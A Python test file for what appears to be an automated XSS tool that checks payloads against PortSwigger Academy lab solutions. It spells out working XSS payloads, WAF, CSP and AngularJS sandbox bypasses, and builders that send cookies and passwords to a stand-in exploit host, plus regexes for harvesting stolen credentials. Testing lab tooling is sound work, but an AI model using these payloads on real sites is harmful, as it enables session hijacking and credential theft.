"""Payload-shape tests: every XSS class payload matches the official,
browser-executable solution shapes (aligned with the PortSwigger Academy
XSS lab family)."""

import re

from bughound.exploits import xss_payloads as xp


def test_all_27_classes_registered():
    assert len(xp.XSS_CLASSES) == 27
    expected = {
        "dom-innerhtml", "dom-jquery-href", "dom-hashchange", "reflected-attr",
        "stored-href", "reflected-jsstring", "dom-docwrite-select", "dom-angular",
        "reflected-dom", "stored-dom", "waf-body-resize", "waf-custom-tag",
        "waf-svg-animate", "canonical-link", "jsstring-script-close",
        "jsstring-backslash", "stored-onclick-entity", "template-literal",
        "impact-cookie-steal", "impact-password-capture", "impact-csrf-bypass",
        "angular-sandbox-nostrings", "angular-sandbox-csp", "waf-svg-click",
        "jsurl-throw", "csp-dangling-markup", "csp-directive-injection",
    }
    assert set(xp.XSS_CLASSES) == expected


def test_title_mapping_all_academy_titles():
    titles = {
        "DOM XSS in innerHTML sink using source location.search": "dom-innerhtml",
        "DOM XSS in jQuery anchor href attribute sink using location.search source": "dom-jquery-href",
        "DOM XSS in jQuery selector sink using a hashchange event": "dom-hashchange",
        "Reflected XSS into attribute with angle brackets HTML-encoded": "reflected-attr",
        "Stored XSS into anchor href attribute with double quotes HTML-encoded": "stored-href",
        "Reflected XSS into a JavaScript string with angle brackets HTML encoded": "reflected-jsstring",
        "DOM XSS in document.write sink using source location.search inside a select element": "dom-docwrite-select",
        "DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded": "dom-angular",
        "Reflected DOM XSS": "reflected-dom",
        "Stored DOM XSS": "stored-dom",
        "Reflected XSS into HTML context with most tags and attributes blocked": "waf-body-resize",
        "Reflected XSS into HTML context with all tags blocked except custom ones": "waf-custom-tag",
        "Reflected XSS with some SVG markup allowed": "waf-svg-animate",
        "Reflected XSS in canonical link tag": "canonical-link",
        "Reflected XSS into a JavaScript string with single quote and backslash escaped": "jsstring-script-close",
        "Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped": "jsstring-backslash",
        "Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped": "stored-onclick-entity",
        "Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped": "template-literal",
        "Exploiting cross-site scripting to steal cookies": "impact-cookie-steal",
        "Exploiting cross-site scripting to capture passwords": "impact-password-capture",
        "Exploiting XSS to bypass CSRF defenses": "impact-csrf-bypass",
        "Reflected XSS with AngularJS sandbox escape without strings": "angular-sandbox-nostrings",
        "Reflected XSS with AngularJS sandbox escape and CSP": "angular-sandbox-csp",
        "Reflected XSS with event handlers and href attributes blocked": "waf-svg-click",
        "Reflected XSS in a JavaScript URL with some characters blocked": "jsurl-throw",
        "Reflected XSS protected by very strict CSP, with dangling markup attack": "csp-dangling-markup",
        "Reflected XSS protected by CSP, with CSP bypass": "csp-directive-injection",
    }
    for title, key in titles.items():
        assert xp.class_key_from_title(title) == key, title


def test_dom_payloads_official_shapes():
    assert xp.DOM_INNERHTML == "<img src=1 onerror=alert(1)>"
    assert xp.DOM_JQUERY_HREF == "javascript:alert(1)"
    assert xp.DOM_DOCWRITE_SELECT == "</select><img src=1 onerror=alert(1)>"
    assert "onload" in xp.dom_hashchange_iframe("https://lab.example.net/")
    assert "this.src+='<img src=x onerror=print()>'" in xp.dom_hashchange_iframe("https://lab/")


def test_context_breakout_shapes():
    assert xp.REFLECTED_ATTR == '"onmouseover="alert(1)'
    assert xp.REFLECTED_ATTR_AUTOFOCUS == '"autofocus onfocus=alert(1) x="'
    assert xp.JSSTRING_BREAKOUT == "'-alert(1)-'"
    assert xp.JSSTRING_SCRIPT_CLOSE == "</script><script>alert(1)</script>"
    # backslash-neutralisation: our backslash escapes the app's escape
    assert xp.JSSTRING_BACKSLASH == "\\'-alert(1)//"
    assert xp.TEMPLATE_LITERAL == "${alert(1)}"
    assert xp.CANONICAL_ACCESSKEY == "'accesskey='X'onclick='alert(1)"
    assert xp.STORED_ONCLICK_ENTITY == "http://foo?&apos;-alert(1)-&apos;"
    assert xp.STORED_DOM == "<><img src=1 onerror=alert(1)>"
    assert xp.REFLECTED_DOM_JSON == '\\"-alert(1)}//'


def test_angular_payloads():
    # official stringless escape: charAt pollution via toString().constructor
    assert "charAt%3d[].join" in xp.ANGULAR_NOSTRINGS_EXPR
    assert "fromCharCode(" in xp.ANGULAR_NOSTRINGS_EXPR
    # fromCharCode codes spell x=alert(1)
    codes = "120,61,97,108,101,114,116,40,49,41"
    assert codes in xp.ANGULAR_NOSTRINGS_EXPR
    assert "ng-focus" in xp.ANGULAR_CSP_PAYLOAD
    assert "composedPath()|orderBy:'(z=alert)(document.cookie)'" in xp.ANGULAR_CSP_PAYLOAD
    assert any("constructor.constructor('alert(1)')()" in p for p in xp.ANGULAR_EXPRESSION)


def test_waf_bypass_shapes():
    assert xp.WAF_BODY_RESIZE == "<body onresize=alert(1)>"
    assert xp.custom_tag_payload() == "<xss id=x tabindex=1 onfocus=alert(1)></xss>"
    assert xp.custom_tag_payload("z") == "<z id=x tabindex=1 onfocus=alert(1)></z>"
    # SVG animate: href as a VALUE of attributeName passes href-attribute filters
    assert "attributeName=href values=javascript:alert(1)" in xp.SVG_ANIMATE_CLICK
    assert xp.SVG_ANIMATE_CLICK.startswith("<svg><a><animate")
    assert "onload=this.style.width='100px'" in xp.resize_iframe("https://lab/", "?search=x")


def test_jsurl_throw_shape():
    # official encoded form: exception handler calls alert(1337)
    assert "throw/**/onerror=alert,1337" in xp.JSURL_THROW_ENCODED
    assert "%3E" in xp.JSURL_THROW_ENCODED  # > encoded
    assert xp.JSURL_THROW_ENCODED.endswith("%7Bx:%27")


def test_impact_chain_builders():
    p = xp.cookie_steal_redirect("https://exploit.example.net")
    assert "document.location='https://exploit.example.net/?c='+encodeURIComponent(document.cookie)" in p
    img = xp.cookie_steal_img("https://collab.example.net/x")
    assert "document.cookie" in img and "onerror" in img
    pc = xp.password_capture_inputs("https://exploit.example.net")
    assert "type=password" in pc and "method:'POST'" in pc and "username.value" in pc
    body = xp.csrf_bypass_body("https://lab.example.net")
    assert "my-account/change-email" in body
    assert "csrf" in body and "form.submit()" in body
    dn = xp.dangling_button_payload("https://exploit.example.net/exploit")
    assert "formaction=https://exploit.example.net/exploit" in dn
    assert "formmethod=get" in dn and "Click me" in dn


def test_csp_directive_injection_shape():
    q = xp.csp_directive_query()
    assert q["search"] == "<script>alert(1)</script>"
    assert q["token"] == ";script-src-elem 'unsafe-inline'"


def test_regex_helpers():
    m2 = re.search(xp.cookie_log_regex(), "GET /?c=session=jA1b2c3d4e5 HTTP/1.1")
    assert m2 and m2.group("name") == "session"
    cm = re.search(xp.credential_log_regex(), "username=wiener:password=hunter2")
    assert cm and cm.group("user") == "wiener" and cm.group("pw") == "hunter2"
    cm2 = re.search(xp.credential_log_regex(), "user wiener password hunter2")
    assert cm2 and cm2.group("user") == "wiener"


def test_candidate_verification():
    c = xp.HTML_BODY_CANDIDATES[0]
    assert c.verify("<p><script>alert(1)</script></p>")
    assert c.verify("<p>&lt;script&gt;alert(1)&lt;/script&gt;</p>") is None
